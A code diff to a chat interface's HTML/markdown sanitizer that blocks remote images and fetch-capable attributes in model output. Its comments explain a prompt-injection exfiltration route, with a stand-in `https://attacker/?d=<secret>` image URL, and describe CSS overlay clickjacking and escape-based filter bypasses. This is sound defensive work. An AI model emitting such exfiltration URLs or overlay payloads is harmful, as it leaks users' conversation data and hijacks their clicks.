@@ -301,12 +301,38 @@ function moreListPayloadFromHref(href) {
 // fabricate a URL) must never leave an empty gap, so each image is paired with
 // a hidden fallback caption (alt text + URL) that _bindChatImageFallback()
 // reveals when the load fails.
+//
+// Same-origin images (relative URLs included) load inline. A remote https
+// image is NOT fetched on render: model output can be steered by a prompt
+// injection into `![x](https://attacker/?d=<secret>)`, which would leak data
+// the moment the reply renders. It renders as a click-to-load placeholder
+// naming the host instead; _bindChatRemoteImageLoad() swaps in the image.
+//
+// _isSameOriginFetchUrl is the one "loads immediately" rule: imageHtml uses
+// it for markdown images and sanitizeAllowedHtml for every fetch-capable
+// attribute in model-written raw HTML.
+function _isSameOriginFetchUrl(parsed) {
+  return parsed.origin === window.location.origin
+    && (parsed.protocol === 'https:' || parsed.protocol === 'http:');
+}
+
+function _isSameOriginFetchUrlText(rawUrl) {
+  try {
+    return _isSameOriginFetchUrl(new URL(String(rawUrl || '').trim(), window.location.origin));
+  } catch (_) {
+    return false;
+  }
+}
+
 function imageHtml(alt, url, title) {
   const rawUrl = String(url || '').trim();
   let safeUrl = '';
+  let remoteHost = '';
   try {
     const parsed = new URL(rawUrl, window.location.origin);
-    if (parsed.protocol === 'https:') safeUrl = parsed.href;
+    const sameOrigin = _isSameOriginFetchUrl(parsed);
+    if (sameOrigin || parsed.protocol === 'https:') safeUrl = parsed.href;
+    if (!sameOrigin) remoteHost = parsed.host;
   } catch (_) {
     safeUrl = '';
   }
@@ -315,6 +341,21 @@ function imageHtml(alt, url, title) {
   const safeTitle = title ? ` title="${escapeHtml(title)}"` : '';
   const displayUrl = escapeHtml(safeUrl);
   const fallbackLabel = escapeHtml(alt || 'Image');
+  if (remoteHost) {
+    // Text inside this <a> must not trip the later autolink passes (a nested
+    // <a> would truncate this one when it is extracted as an allowed-HTML
+    // block), so the host's dots are entity-encoded.
+    const hostText = escapeHtml(remoteHost).replace(/\./g, '&#46;');
+    const titleData = title ? ` data-chat-image-title="${escapeHtml(title)}"` : '';
+    return (
+      `<a class="chat-image chat-image-remote" href="${displayUrl}" target="_blank" rel="noopener noreferrer"` +
+      ` data-chat-image-src="${displayUrl}" data-chat-image-alt="${safeAlt}"${titleData}` +
+      ` title="Remote image not loaded. Click to load it from ${hostText}">` +
+      `<span class="chat-image-remote-title">${fallbackLabel}</span>` +
+      `<span class="chat-image-remote-sub">Remote image blocked · ${hostText} · Click to load</span>` +
+      `</a>`
+    );
+  }
   // The fallback caption shows the URL as readable text, but a bare
   // `https://` in that text would be caught by the later bare-URL autolink
   // pass and wrapped in a nested <a> — which then truncates this outer <a>
@@ -347,7 +388,47 @@ function _bindChatImageFallback() {
     if (wrap) wrap.classList.remove('image-broken');
   }, true);
 }
+
+// Load a remote chat image only when the user clicks its placeholder. Runs in
+// the capture phase so the placeholder's href (kept so it still opens the
+// image without JS) never navigates and no other link handler sees the click.
+// After the swap the <a> is an ordinary .chat-image thumbnail again.
+function _bindChatRemoteImageLoad() {
+  if (typeof document === 'undefined' || !document.addEventListener) return;
+  document.addEventListener('click', (event) => {
+    const link = event?.target?.closest?.('a.chat-image-remote');
+    if (!link) return;
+    event.preventDefault();
+    event.stopImmediatePropagation();
+    let src = '';
+    try {
+      const parsed = new URL(link.dataset.chatImageSrc || '', window.location.origin);
+      if (parsed.protocol === 'https:') src = parsed.href;
+    } catch (_) {
+      src = '';
+    }
+    if (!src) return;
+    const alt = link.dataset.chatImageAlt || '';
+    const img = document.createElement('img');
+    img.className = 'chat-inline-image';
+    img.alt = alt;
+    if (link.dataset.chatImageTitle) img.title = link.dataset.chatImageTitle;
+    img.decoding = 'async';
+    img.referrerPolicy = 'no-referrer';
+    img.src = src;
+    const fallback = document.createElement('span');
+    fallback.className = 'chat-image-fallback';
+    fallback.textContent = `${alt || 'Image'} — ${src}`;
+    link.classList.remove('chat-image-remote');
+    link.removeAttribute('data-chat-image-src');
+    link.removeAttribute('data-chat-image-alt');
+    link.removeAttribute('data-chat-image-title');
+    link.title = 'Open image in a new tab';
+    link.replaceChildren(img, fallback);
+  }, true);
+}
 _bindChatImageFallback();
+_bindChatRemoteImageLoad();
 
 function _isModelEndpointUrl(rawUrl) {
   try {
@@ -400,16 +481,63 @@ function _isDangerousSrcset(value) {
   return String(value || '').split(',').some(candidate => _isDangerousUrl(candidate));
 }
 
-function _cleanAllowedHtmlOnce(htmlString) {
+// A kept `style` must not lift an element out of the message flow: a
+// `position:fixed;inset:0;opacity:0` link would cover the whole app and
+// hijack the next click. Refuse any position other than static/relative, and
+// any backslash (CSS escape, e.g. `\70 osition`) or comment opener
+// (`pos/**/ition`) that could hide a declaration from this text check.
+const _SAFE_CSS_POSITIONS = new Set(['static', 'relative']);
+
+function _isOverlayStyle(value) {
+  const css = String(value || '');
+  if (css.includes('\\') || css.includes('/*')) return true;
+  // `position` as a whole property name anywhere (so `@x{}position:fixed` is
+  // seen), but not the tail of `background-position` / `object-position`.
+  const decl = /(?<![A-Za-z0-9_-])position\s*:\s*([^;]*)/gi;
+  let m;
+  while ((m = decl.exec(css)) !== null) {
+    if (!_SAFE_CSS_POSITIONS.has(m[1].trim().toLowerCase())) return true;
+  }
+  return false;
+}
+
+// Model-written raw HTML must not make the browser fetch from another origin
+// on render (prompt injection could put conversation text in the URL). These
+// attributes fetch without a click; each is dropped unless its URL passes the
+// same rule imageHtml uses to load an image immediately. `href` fetches only
+// off an <a> (an <a> needs a click), so it is checked on every other tag.
+const _ALLOWED_HTML_FETCH_ATTRS = new Set(['src', 'poster', 'background', 'data', 'ping']);
+
+function _getAttr(el, name) {
+  const attr = Array.from(el.attributes).find(a => a.name.toLowerCase() === name);
+  return attr ? attr.value : null;
+}
+
+// keepRemoteMedia (document editor only): skip the three remote-fetch rules
+// below (remote <img> placeholder, fetch-attribute removal, fetching-style
+// removal) so user-inserted remote images round-trip. Every other rule applies.
+function _cleanAllowedHtmlOnce(htmlString, keepRemoteMedia) {
   const tpl = document.createElement('template');
   tpl.innerHTML = htmlString;
   for (const el of Array.from(tpl.content.querySelectorAll('*'))) {
     // Upper-case the tag for comparison: HTML tagNames are upper-case, but
     // SVG/MathML elements preserve their original (lower/camel) case, so a
     // raw `Set.has(el.tagName)` would miss e.g. a namespaced <script>.
-    if (_ALLOWED_HTML_BAD_TAGS.has(el.tagName.toUpperCase())) {
+    const tag = el.tagName.toUpperCase();
+    if (_ALLOWED_HTML_BAD_TAGS.has(tag)) {
       el.remove();
       continue;
+    }
+    // A remote <img> becomes the same click-to-load placeholder a remote
+    // markdown image gets. (A dangerous-scheme src is dropped below instead.)
+    if (tag === 'IMG' && !keepRemoteMedia) {
+      const src = _getAttr(el, 'src');
+      if (src !== null && !_isDangerousUrl(src) && !_isSameOriginFetchUrlText(src)) {
+        const swap = document.createElement('template');
+        swap.innerHTML = imageHtml(_getAttr(el, 'alt') || '', src, _getAttr(el, 'title') || '');
+        el.replaceWith(swap.content);
+        continue;
+      }
     }
     for (const attr of Array.from(el.attributes)) {
       const name = attr.name.toLowerCase();
@@ -421,9 +549,27 @@ function _cleanAllowedHtmlOnce(htmlString) {
       }
       if (name === 'style') {
         const value = _compactUrlSchemeValue(attr.value);
-        if (/javascript:|vbscript:|data:|expression\(/.test(value)) {
+        // url( / image-set( / src( would fetch on render (any property).
+        const fetchRe = keepRemoteMedia
+          ? /javascript:|vbscript:|data:|expression\(/
+          : /javascript:|vbscript:|data:|expression\(|url\(|image-set\(|src\(/;
+        if (fetchRe.test(value)
+            || _isOverlayStyle(attr.value)
+            || (el.style && el.style.position && !_SAFE_CSS_POSITIONS.has(el.style.position.toLowerCase()))) {
           el.removeAttribute(attr.name);
         }
+        continue;
+      }
+      // srcset (<img>/<source>) is never kept: each candidate would fetch.
+      if (name === 'srcset' && !keepRemoteMedia) {
+        el.removeAttribute(attr.name);
+        continue;
+      }
+      if (!keepRemoteMedia
+          && (_ALLOWED_HTML_FETCH_ATTRS.has(name)
+           || ((name === 'href' || name === 'xlink:href') && tag !== 'A'))
+          && !_isSameOriginFetchUrlText(attr.value)) {
+        el.removeAttribute(attr.name);
         continue;
       }
       // Neutralize javascript:/vbscript:/data: in URL-bearing attributes.
@@ -438,7 +584,10 @@ function _cleanAllowedHtmlOnce(htmlString) {
   return tpl.innerHTML;
 }
 
-export function sanitizeAllowedHtml(html) {
+// Default is the strict chat behaviour. Only the document editor's load
+// paths pass { keepRemoteMedia: true } (see _cleanAllowedHtmlOnce).
+export function sanitizeAllowedHtml(html, options) {
+  const keepRemoteMedia = !!(options && options.keepRemoteMedia === true);
   const raw = String(html == null ? '' : html);
   // Non-browser context (e.g. a future SSR/Node import): fail closed by
   // escaping rather than trusting the markup.
@@ -448,7 +597,7 @@ export function sanitizeAllowedHtml(html) {
   // tree (the basis of mutation-XSS), so re-clean until it stops changing.
   let out = raw;
   for (let i = 0; i < 4; i++) {
-    const next = _cleanAllowedHtmlOnce(out);
+    const next = _cleanAllowedHtmlOnce(out, keepRemoteMedia);
     if (next === out) break;
     out = next;
   }
